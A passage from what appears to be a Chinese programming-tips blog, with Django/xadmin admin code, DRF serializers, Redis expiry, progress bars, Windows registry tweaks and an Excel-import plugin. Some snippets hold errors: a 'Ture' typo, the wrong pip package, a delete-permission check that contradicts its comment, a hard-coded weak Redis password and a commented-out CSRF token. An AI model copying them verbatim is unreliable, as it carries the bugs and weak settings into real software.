class=\"line\"></span><br><span class=\"line\"># adminx.py</span><br><span class=\"line\"># 用户列表</span><br><span class=\"line\">class UserAdmin(object):</span><br><span class=\"line\">    list_display = [ &#x27;code&#x27;, &#x27;phone&#x27;, &#x27;name&#x27;,]</span><br><span class=\"line\">    search_fields = [&#x27;code&#x27;, &#x27;phone&#x27;]</span><br><span class=\"line\">    list_filter = [&#x27;code&#x27;, &#x27;phone&#x27;]</span><br><span class=\"line\">    list_editable = [&#x27;name&#x27;]  # 数据即时编辑</span><br><span class=\"line\">    readonly_fields = [&#x27;code&#x27;, &#x27;phone&#x27;, &#x27;name&#x27;]  # 只读字段，不能编辑</span><br><span class=\"line\">    model_icon = &#x27;fa fa-square&#x27;</span><br><span class=\"line\">    model = UserInfo</span><br><span class=\"line\">    </span><br><span class=\"line\">    def has_delete_permission(self, *args, **kwargs):</span><br><span class=\"line\">    \t# 禁止删除</span><br><span class=\"line\">        if args:</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        return False</span><br><span class=\"line\">    </span><br><span class=\"line\">\tdef has_add_permission(self,*args,**kwargs):</span><br><span class=\"line\">\t\t# 禁止增加</span><br><span class=\"line\">        return False</span><br><span class=\"line\">        </span><br><span class=\"line\">    def save_models(self):</span><br><span class=\"line\">    \t# 用户级别设置</span><br><span class=\"line\">        self.new_obj.user = self.request.user</span><br><span class=\"line\">        flag = self.org_obj is None and &#x27;create&#x27; or &#x27;change&#x27;</span><br><span class=\"line\">        if flag == &#x27;create&#x27;:</span><br><span class=\"line\">        \t# 对密码字段进行加密</span><br><span class=\"line\">            self.new_obj.password = encrypt_oracle(self.new_obj.password)</span><br><span class=\"line\">        elif flag == &#x27;change&#x27;:</span><br><span class=\"line\">            if &#x27;password&#x27; in self.change_message():</span><br><span class=\"line\">                self.new_obj.password = encrypt_oracle(self.new_obj.password)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">        \tpass</span><br><span class=\"line\">        super().save_models()</span><br><span class=\"line\"></span><br><span class=\"line\">xadmin.site.register(UserInfo, UserAdmin)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"40、时间格式字符串相减\"><a href=\"#40、时间格式字符串相减\" class=\"headerlink\" title=\"40、时间格式字符串相减\"></a>40、时间格式字符串相减</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import datetime</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">start = str(datetime.datetime.now())[:19]</span><br><span class=\"line\">time.sleep(60)</span><br><span class=\"line\">end = str(datetime.datetime.now())[:19]</span><br><span class=\"line\">print(start,end)</span><br><span class=\"line\">link_start = datetime.datetime.strptime(start, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">link_end = datetime.datetime.strptime(end, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">link_min = round((link_end - link_start).seconds / 60, 2)</span><br><span class=\"line\">print(link_min,&#x27;分钟&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"41、显示循环进度条\"><a href=\"#41、显示循环进度条\" class=\"headerlink\" title=\"41、显示循环进度条\"></a>41、显示循环进度条</h2><p>参考：<a href=\"https://blog.csdn.net/zejianli/article/details/77915751\">https://blog.csdn.net/zejianli/article/details/77915751</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from tqdm import tqdm,trange</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\">text = &quot;&quot;</span><br><span class=\"line\">for char in tqdm([&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]):</span><br><span class=\"line\">    text = text + char</span><br><span class=\"line\">    sleep(1)</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"># 方式二</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def process_bar(percent, index, total,start_time, start_str=&#x27;&#x27;, end_str=&#x27;&#x27;, total_length=100):</span><br><span class=\"line\">    # 进度条</span><br><span class=\"line\">    percent_length = int(percent)</span><br><span class=\"line\">    bar = &#x27;\\r&#x27; + start_str + (&#x27;\\033[1;31;41m \\033[0m&#x27; * percent_length + &#x27;\\033[1;37;47m \\033[0m&#x27; * (</span><br><span class=\"line\">                total_length - percent_length)) + f&#x27;  &#123;round(index / total * 100, 2)&#125;%  &#x27; + f&#x27; &#123;index&#125;|&#123;end_str&#125;&#x27;+ f&#x27;   |已进行时间: &#123;round(time.time() - start_time, 2)&#125;秒&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    print(bar, end=&#x27;&#x27;, flush=True)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    data_set = [i for i in range(23)]</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    start_time = time.time()</span><br><span class=\"line\">    total = len(data_set)</span><br><span class=\"line\">    end_str = &#x27;&#123;&#125;&#x27;.format(total)</span><br><span class=\"line\">    for data in data_set:</span><br><span class=\"line\">        time.sleep(1)</span><br><span class=\"line\">        i += 1</span><br><span class=\"line\">        process_bar(i * 100 / total, i, total, start_time, start_str=&#x27;&#x27;, end_str=end_str, total_length=100)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方式三</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">d = [i for i in range(100)]</span><br><span class=\"line\">for i in range(len(d)):</span><br><span class=\"line\">    time.sleep(1)</span><br><span class=\"line\">    sys.stdout.write(&#x27;\\r&gt;&gt; Downloading  %.2f%%&#x27; % (float(i) / float(len(d)) * 100.0))</span><br><span class=\"line\">sys.stdout.flush()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"42、把列表中的字典转成csv文件\"><a href=\"#42、把列表中的字典转成csv文件\" class=\"headerlink\" title=\"42、把列表中的字典转成csv文件\"></a>42、把列表中的字典转成csv文件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import pandas as pd</span><br><span class=\"line\">lists = [&#123;&#x27;a&#x27;:1,&#x27;b&#x27;:2&#125;,&#123;&#x27;a&#x27;:2,&#x27;b&#x27;:3&#125;]</span><br><span class=\"line\">df = pd.DataFrame(lists)</span><br><span class=\"line\">print(df)</span><br><span class=\"line\">df.to_csv(&#x27;result2.csv&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"43、windows添加右键新建MarkDown文件\"><a href=\"#43、windows添加右键新建MarkDown文件\" class=\"headerlink\" title=\"43、windows添加右键新建MarkDown文件\"></a>43、windows添加右键新建MarkDown文件</h2><p>在网上下载Typora软件安装后<br>1、在桌面上新建一个txt文件，输入以下内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\.md\\ShellNew]</span><br><span class=\"line\">&quot;NullFile&quot;=&quot;&quot;</span><br><span class=\"line\">&quot;FileName&quot;=&quot;template.md&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2、另存为，改后缀为.reg，保存类型为.txt，编码为Unicode</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200526232015169.png\" alt=\"在这里插入图片描述\"></p>\n<p>3、双击运行，确定，重启电脑，此时在桌面右键就有了新建md文件</p>\n<h2 id=\"44、redis设置值定时过期\"><a href=\"#44、redis设置值定时过期\" class=\"headerlink\" title=\"44、redis设置值定时过期\"></a>44、redis设置值定时过期</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import datetime</span><br><span class=\"line\">import redis</span><br><span class=\"line\"></span><br><span class=\"line\">redis_client = redis.Redis(</span><br><span class=\"line\">    host=&#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    port=6379,</span><br><span class=\"line\">    db=0,</span><br><span class=\"line\">    password=&#x27;123456&#x27;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">def redis_set():</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    redis设置值定时过期</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    global redis_client</span><br><span class=\"line\"></span><br><span class=\"line\">    redis_client.set(&#x27;name&#x27;,&#x27;ldc&#x27;)</span><br><span class=\"line\">    now = datetime.datetime.now()</span><br><span class=\"line\">    # 设置‘name’50秒过期</span><br><span class=\"line\">    expire_time = now + datetime.timedelta(hours=0, minutes=0, seconds=50)</span><br><span class=\"line\">    redis_client.expireat(&#x27;name&#x27;, expire_time)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    redis_set()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"45、linux根据端口杀进程\"><a href=\"#45、linux根据端口杀进程\" class=\"headerlink\" title=\"45、linux根据端口杀进程\"></a>45、linux根据端口杀进程</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def killport(port):</span><br><span class=\"line\">    command = &#x27;&#x27;&#x27;kill -9 $(netstat -nlp | grep :&#x27;&#x27;&#x27; + str(port) + &#x27;&#x27;&#x27; | awk &#x27;&#123;print $7&#125;&#x27; | awk -F&quot;/&quot; &#x27;&#123; print $1 &#125;&#x27;)&#x27;&#x27;&#x27;</span><br><span class=\"line\">    os.system(command)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 开始执行</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    port = 4237</span><br><span class=\"line\">    killport(port)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"46、监控linux网络流量\"><a href=\"#46、监控linux网络流量\" class=\"headerlink\" title=\"46、监控linux网络流量\"></a>46、监控linux网络流量</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">iftop -n -N -i eth0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">nethogs eth0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vim +/字符串 文件</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"47、win10添加右键打开cmd\"><a href=\"#47、win10添加右键打开cmd\" class=\"headerlink\" title=\"47、win10添加右键打开cmd\"></a>47、win10添加右键打开cmd</h2><p>通过添加注册表项实现</p>\n<p>win + r 输入 regedit</p>\n<p>找到注册表位置：HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\</p>\n<p>右键“shel”l,新建“项”，命名为“以管理员身份打开cmd”，</p>\n<p>右键“以管理员身份打开cmd”，新建“DWORD(32位)值”，命名为”ShowBasedOnVelocityId”,值为“639bc8”</p>\n<p>右键“以管理员身份打开cmd”，新建“项”，命名为“command”</p>\n<p>右键“command”，点击“默认”，点击“修改”，填写数值为 cmd.exe /s /k pushd “%V”</p>\n<h2 id=\"48、xadmin后台无法显示下拉框完整内容\"><a href=\"#48、xadmin后台无法显示下拉框完整内容\" class=\"headerlink\" title=\"48、xadmin后台无法显示下拉框完整内容\"></a>48、xadmin后台无法显示下拉框完整内容</h2><p>解决方案 在根目录中找到/static/xadmin/vendor/selectize/selectize.bootstrap3.css<br>在331行后加入 position: static;</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190704184201572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"49、xadmin单点登录\"><a href=\"#49、xadmin单点登录\" class=\"headerlink\" title=\"49、xadmin单点登录\"></a>49、xadmin单点登录</h2><p>使用中间件实现。</p>\n<p>新建一个utils.py文件，存放以下代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from django.contrib.sessions.models import Session</span><br><span class=\"line\">from django.db.models import Q</span><br><span class=\"line\">from django.utils import timezone</span><br><span class=\"line\">from django.utils.deprecation import MiddlewareMixin</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class XadminMiddleware(MiddlewareMixin):</span><br><span class=\"line\">    def process_request(self, request):</span><br><span class=\"line\">        &quot;&quot;&quot;xadmin后台单点登录&quot;&quot;&quot;</span><br><span class=\"line\">        PATH_INFO = request.META.get(&#x27;PATH_INFO&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">        if PATH_INFO and &#x27;xadmin&#x27; in PATH_INFO:</span><br><span class=\"line\">            request.session.clear_expired()   # 清除过期的key</span><br><span class=\"line\">            session_key = request.session.session_key</span><br><span class=\"line\">            for session in Session.objects.filter(~Q(session_key=session_key), expire_date__gte=timezone.now()):</span><br><span class=\"line\">                data = session.get_decoded()</span><br><span class=\"line\">                if data.get(&#x27;_auth_user_id&#x27;, None) == str(request.user.id):</span><br><span class=\"line\">                    session.delete()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后在urls.py中设置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">...</span><br><span class=\"line\">re_path(&#x27;^xadmin/&#x27;, xadmin.site.urls),</span><br><span class=\"line\">...</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>然后在settings.py中注册中间件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">   MIDDLEWARE = [</span><br><span class=\"line\">   ...</span><br><span class=\"line\">   </span><br><span class=\"line\">   &#x27;utils.xadminauth.XadminMiddleware&#x27;,</span><br><span class=\"line\">   ...</span><br><span class=\"line\">   ]</span><br><span class=\"line\">SESSION_COOKIE_AGE = 1209600  # 设置过期时间</span><br><span class=\"line\">   SESSION_SAVE_EVERY_REQUEST = Ture  # 每次请求都更新</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>【参考】 <a href=\"https://blog.csdn.net/Python_anning\">https://blog.csdn.net/Python_anning</a></p>\n<h2 id=\"50、Django-restful-多个models数据表序列化合并返回（一次请求返回多个序列化器数据）\"><a href=\"#50、Django-restful-多个models数据表序列化合并返回（一次请求返回多个序列化器数据）\" class=\"headerlink\" title=\"50、Django restful 多个models数据表序列化合并返回（一次请求返回多个序列化器数据）\"></a>50、Django restful 多个models数据表序列化合并返回（一次请求返回多个序列化器数据）</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 导入第三方包</span><br><span class=\"line\">pip install django-crispy-forms==1.7.2</span><br><span class=\"line\"></span><br><span class=\"line\"># 在settings.py中添加应用</span><br><span class=\"line\">INSTALLED_APPS = [</span><br><span class=\"line\">...</span><br><span class=\"line\">&#x27;drf_multiple_model&#x27;,</span><br><span class=\"line\">&#x27;rest_framework&#x27;,</span><br><span class=\"line\">...</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"># 在views.py中使用</span><br><span class=\"line\">    from drf_multiple_model.pagination import MultipleModelLimitOffsetPagination</span><br><span class=\"line\">    from drf_multiple_model.views import ObjectMultipleModelAPIView</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    class LimitPagination(MultipleModelLimitOffsetPagination):</span><br><span class=\"line\">        # 多个models数据表联合查询，分页，每页限制数据10条</span><br><span class=\"line\">        default_limit = 10</span><br><span class=\"line\">        </span><br><span class=\"line\">    class StudentSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">        &quot;&quot;&quot;学生表序列化器&quot;&quot;&quot;</span><br><span class=\"line\">        # merchant = MerchantSerializers()</span><br><span class=\"line\">        </span><br><span class=\"line\">        register_time = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class=\"line\">       </span><br><span class=\"line\">        class Meta:</span><br><span class=\"line\">            model = Student</span><br><span class=\"line\">            fields = &#x27;__all__&#x27;</span><br><span class=\"line\">    class ClassesSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">        &quot;&quot;&quot;班级表序列化器&quot;&quot;&quot;</span><br><span class=\"line\">        # merchant = MerchantSerializers()</span><br><span class=\"line\">        </span><br><span class=\"line\">        add_time = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class=\"line\">       </span><br><span class=\"line\">        class Meta:</span><br><span class=\"line\">            model = Classes</span><br><span class=\"line\">            fields = &#x27;__all__&#x27;</span><br><span class=\"line\">    </span><br><span class=\"line\">    class SchoolSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">        &quot;&quot;&quot;学校表序列化器&quot;&quot;&quot;</span><br><span class=\"line\">        # merchant = MerchantSerializers()</span><br><span class=\"line\">        </span><br><span class=\"line\">        add_time = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class=\"line\">       </span><br><span class=\"line\">        class Meta:</span><br><span class=\"line\">            model = School</span><br><span class=\"line\">            fields = &#x27;__all__&#x27;      </span><br><span class=\"line\">            </span><br><span class=\"line\">    </span><br><span class=\"line\">    class StudentInfo(ObjectMultipleModelAPIView):</span><br><span class=\"line\">        # 获取学生信息，班级信息，学校信息</span><br><span class=\"line\">    </span><br><span class=\"line\">        def get(self, request, *args, **kwargs):</span><br><span class=\"line\">            uid = request.GET.get(&#x27;uid&#x27;, &#x27;&#x27;)  # 学生id</span><br><span class=\"line\">            cid = request.GET.get(&#x27;cid&#x27;, &#x27;&#x27;)  # 班级id</span><br><span class=\"line\">            sid = request.GET.get(&#x27;sid&#x27;, &#x27;&#x27;)  # 学校id</span><br><span class=\"line\">            </span><br><span class=\"line\">            self.querylist = [</span><br><span class=\"line\">                &#123;&#x27;queryset&#x27;: Student.objects.filter(id=uid).order_by(&#x27;-id&#x27;),</span><br><span class=\"line\">                    &#x27;serializer_class&#x27;:  StudentSerializers, &#x27;label&#x27;: &#x27;student&#x27;, &#125;,</span><br><span class=\"line\">                &#123;&#x27;queryset&#x27;: Classes.objects.filter(id=cid).order_by(&#x27;-id&#x27;),</span><br><span class=\"line\">                    &#x27;serializer_class&#x27;:  ClassesSerializers, &#x27;label&#x27;: &#x27;classes&#x27;, &#125;,</span><br><span class=\"line\">                &#123;&#x27;queryset&#x27;: School.objects.filter(id=sid).order_by(&#x27;-id&#x27;),</span><br><span class=\"line\">                    &#x27;serializer_class&#x27;:  SchoolSerializers, &#x27;label&#x27;: &#x27;school&#x27;, &#125;,</span><br><span class=\"line\">            ]</span><br><span class=\"line\">    </span><br><span class=\"line\">            return self.list(request, *args, **kwargs)</span><br><span class=\"line\">    </span><br><span class=\"line\">        pagination_class = LimitPagination</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"51、-Django序列化器返回外键关联数据\"><a href=\"#51、-Django序列化器返回外键关联数据\" class=\"headerlink\" title=\"51、 Django序列化器返回外键关联数据\"></a>51、 Django序列化器返回外键关联数据</h2><p>通过 related_name=’goods_price’把两个表关联起来，当返回Goods的信息时也会返回相应的GoodsPrice信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class GoodsPriceSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">    &quot;&quot;&quot;商品价格表序列化器&quot;&quot;&quot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        model = GoodsPrice</span><br><span class=\"line\">        fields = [&#x27;price&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">class GoodsSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">    &quot;&quot;&quot;商品表序列化器&quot;&quot;&quot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    goods_price = GoodsPriceSerializers(many=True, read_only=True)</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        model = Goods</span><br><span class=\"line\">        fields = [&#x27;title&#x27;,&#x27;goods_price&#x27;]</span><br><span class=\"line\">        depth = 2</span><br><span class=\"line\"></span><br><span class=\"line\">class Goods(models.Model):</span><br><span class=\"line\">    &quot;&quot;&quot;商品表&quot;&quot;&quot;</span><br><span class=\"line\">    title = models.CharField(max_length=50, verbose_name=&#x27;商品名称&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        db_table = &#x27;goods&#x27;</span><br><span class=\"line\">        verbose_name = &#x27;商品信息表&#x27;</span><br><span class=\"line\">        verbose_name_plural = verbose_name</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.title</span><br><span class=\"line\"></span><br><span class=\"line\">class GoodsPrice(models.Model):</span><br><span class=\"line\">    &quot;&quot;&quot;商品价格表,通过外键关联商品信息表&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    price = models.DecimalField(max_digits=10, decimal_places=2, default=0, verbose_name=&#x27;售价&#x27;)</span><br><span class=\"line\">    goods = models.ForeignKey(to=&#x27;Goods&#x27;, related_name=&#x27;goods_price&#x27;, on_delete=models.SET_NULL, blank=True, null=True,verbose_name=&#x27;商品&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return str(self.price)</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        managed = True</span><br><span class=\"line\">        db_table = &#x27;goodsPrice&#x27;</span><br><span class=\"line\">        verbose_name = &#x27;商品售价&#x27;</span><br><span class=\"line\">        verbose_name_plural = verbose_name</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"52、python-Django通过User-Agent判断请求来源是微信扫一扫或者是支付宝扫一扫\"><a href=\"#52、python-Django通过User-Agent判断请求来源是微信扫一扫或者是支付宝扫一扫\" class=\"headerlink\" title=\"52、python Django通过User Agent判断请求来源是微信扫一扫或者是支付宝扫一扫\"></a>52、python Django通过User Agent判断请求来源是微信扫一扫或者是支付宝扫一扫</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class Footest(APIView):</span><br><span class=\"line\"> def get(self, request, *args, **kwargs):</span><br><span class=\"line\">     # print(request.META)</span><br><span class=\"line\">     if &#x27;MicroMessenger&#x27; in request.META[&#x27;HTTP_USER_AGENT&#x27;]:</span><br><span class=\"line\">         return Response(data=&#123;&#x27;msg&#x27;: &#x27;访问来源是微信&#x27;&#125;)</span><br><span class=\"line\">     elif &#x27;AlipayClient&#x27; in request.META[&#x27;HTTP_USER_AGENT&#x27;]:</span><br><span class=\"line\">         return Response(data=&#123;&#x27;msg&#x27;: &#x27;访问来源是支付宝&#x27;&#125;)</span><br><span class=\"line\">     else:</span><br><span class=\"line\">         return Response(data=&#123;&#x27;msg&#x27;: &#x27;访问来源是其他&#x27;&#125;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>\n<p>浏览器的 UA 字串</p>\n<p>标准格式为： 浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言) 渲染引擎标识 版本信息</p>\n<p>获取user-Agent 之后，<br>通过识别MicroMessenger或者AlipayClient这样的关键字应该就可以判断是微信还是支付宝<br>【参考文章】 <a href=\"https://blog.csdn.net/fly910905/article/details/82498813?utm_source=blogxgwz4\">https://blog.csdn.net/fly910905/article/details/82498813?utm_source=blogxgwz4</a></p>\n<h2 id=\"53、xadmin后台集成’导入‘插件，导入excel文件\"><a href=\"#53、xadmin后台集成’导入‘插件，导入excel文件\" class=\"headerlink\" title=\"53、xadmin后台集成’导入‘插件，导入excel文件\"></a>53、xadmin后台集成’导入‘插件，导入excel文件</h2><p>效果图：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190426190357134.png\" alt=\"在这里插入图片描述\"></p>\n<p>1、添加</p>\n<p>在虚拟环境根目录\\Lib\\site-packages\\xadmin\\plugins中添加excel.py文件</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190426190440451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<pre><code>from xadmin.views import BaseAdminPlugin, ListAdminView\nfrom django.template import loader\nimport xadmin\n\nclass ListExcelImportPlugin(BaseAdminPlugin):\n    # 重写init_request\n    import_excel = False\n    def init_request(self, *args, **kwargs):\n        return self.import_excel\n\n    def block_top_toolbar(self, context, nodes):\n        # 这里 xadmin/excel/model_list.top_toolbar.import.html 是自己写的html文件\n      nodes.append(loader.render_to_string(&quot;xadmin/excel/model_list.top_toolbar.import.html&quot;))\n\nxadmin.site.register_plugin(ListExcelImportPlugin, ListAdminView)\n</code></pre>\n<p>在虚拟环境根目录\\Lib\\site-packages\\xadmin\\plugins__init__.py中</p>\n<pre><code>PLUGINS = (\n...\n    &#39;excel&#39;,\n...\n)\n</code></pre>\n<p>2、添加html文件</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190426190455263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>在虚拟环境根目录\\Lib\\site-packages\\xadmin\\templates\\xadmin\\中增加文件夹excel,在文件夹中添加model_list.top_toolbar.import.html文件</p>\n<pre><code>    &#123;% load i18n %&#125;\n&lt;div class=&quot;btn-group export&quot;&gt;\n    &lt;a class=&quot;dropdown-toggle btn btn-default btn-sm&quot; data-toggle=&quot;dropdown&quot; href=&quot;#&quot;&gt;\n        &lt;i class=&quot;icon-share&quot;&gt;&lt;/i&gt; 导入数据 &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;\n    &lt;/a&gt;\n    &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot; aria-labelledby=&quot;dLabel&quot;&gt;\n        &lt;li&gt;&lt;a data-toggle=&quot;modal&quot; data-target=&quot;#export-modal-import-excel&quot;&gt;&lt;i class=&quot;icon-circle-arrow-down&quot;&gt;&lt;/i&gt; 导入\n            Excel&lt;/a&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n\n    &lt;div id=&quot;export-modal-import-excel&quot; class=&quot;modal fade&quot;&gt;\n        &lt;div class=&quot;modal-dialog&quot;&gt;\n            &lt;div class=&quot;modal-content&quot;&gt;\n                &lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt;\n                    &lt;!--&#123;% csrf_token %&#125;--&gt;\n                    &lt;div class=&quot;modal-header&quot;&gt;\n                        &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot; aria-hidden=&quot;true&quot;&gt;×&lt;/button&gt;\n                        &lt;h4 class=&quot;modal-title&quot;&gt;导入 Excel&lt;/h4&gt;\n                    &lt;/div&gt;\n                    &lt;div class=&quot;modal-body&quot;&gt;\n                        &lt;input type=&quot;file&quot; onchange=&quot;fileChange(this)&quot; name=&quot;excel&quot; id=&quot;submit_upload&quot;&gt;\n                    &lt;/div&gt;\n                    &lt;div class=&quot;modal-footer&quot;&gt;\n                        &lt;button type=&quot;button&quot; class=&quot;btn btn-default&quot; data-dismiss=&quot;modal&quot;&gt;&#123;% trans \"Close\" %&#125;&lt;/button&gt;\n                        &lt;button class=&quot;btn btn-success&quot; type=&quot;button&quot; id=&quot;submit_upload_b&quot;&gt;&lt;i class=&quot;icon-share&quot;&gt;&lt;/i&gt; 导入\n                        &lt;/button&gt;\n                    &lt;/div&gt;\n                &lt;/form&gt;\n            &lt;/div&gt;&lt;!-- /.modal-content --&gt;\n        &lt;/div&gt;&lt;!-- /.modal-dalog --&gt;\n    &lt;/div&gt;&lt;!-- /.modal --&gt;\n\n&lt;/div&gt;\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    function fileChange(target) &#123;\n        //检测上传文件的类型\n        var imgName = document.all.submit_upload.value;\n        var ext, idx;\n        if (imgName == &#39;&#39;) &#123;\n            document.all.submit_upload_b.disabled = true;\n            alert(&quot;请选择需要上传的 xls 文件!&quot;);\n            return;\n        &#125; else &#123;\n            idx = imgName.lastIndexOf(&quot;.&quot;);\n            if (idx != -1) &#123;\n                ext = imgName.substr(idx + 1).toUpperCase();\n                ext = ext.toLowerCase();\n\n                if (ext != &#39;xls&#39; &amp;&amp; ext != &#39;xlsx&#39;) &#123;\n                    document.all.submit_upload_b.disabled = true;\n                    alert(&quot;只能上传 .xls 类型的文件!&quot;);\n                    return;\n                &#125;\n            &#125; else &#123;\n                document.all.submit_upload_b.disabled = true;\n                alert(&quot;只能上传 .xls 类型的文件!&quot;);\n                return;\n            &#125;\n        &#125;\n    &#125;\n\n    $(document).ready(function () &#123;\n\n        $(&#39;#submit_upload_b&#39;).click(function () &#123;\n            var form_data = new FormData();\n            var file_info = $(&#39;#submit_upload&#39;)[0].files[0];\n            form_data.append(&#39;file&#39;, file_info);\n            form_data.append(&#39;file_source&#39;, $(&#39;.breadcrumb li&#39;).eq(1).text().trim());\n            var url = window.location.protocol + &#39;//&#39; + window.location.host + 